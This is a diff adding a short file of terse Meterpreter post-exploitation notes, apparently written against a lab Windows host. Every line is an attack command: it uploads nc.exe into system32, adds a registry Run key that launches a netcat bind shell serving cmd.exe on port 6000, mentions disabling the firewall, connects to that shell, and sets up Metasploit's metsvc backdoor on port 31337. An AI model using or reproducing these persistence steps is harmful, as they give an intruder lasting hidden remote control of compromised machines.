@@ -1,0 +1,16 @@
+upload /usr/share/windows-binaries/nc.exe  c:\\windows\\system32\\nc.exe
+reg enumkey -k HKLM\\software\\microsoft\\windows\\currentversion\\run
+reg setval -k HKCU\\software\\microsoft\\windows\\currentversion\\run -v netcat -d 'c:\users\maldev\nc.exe -ldp 6000 -e cmd.exe'
+reg queryval -k HKCU\\software\\microsoft\\windows\\currentversion\\run -v netcat
+disable some firewall
+nc -vn 192.168.56.5 6000
+set payload windows/shell_bind_tcp
+post attack maintain access
+run metsvc
+ use exploit/multi/handler
+ set payload windows/metsvc_bind_tcp
+ set LPORT 31337
+set RHOST 192.168.56.5
+run - no longer working on windows 10
+
+
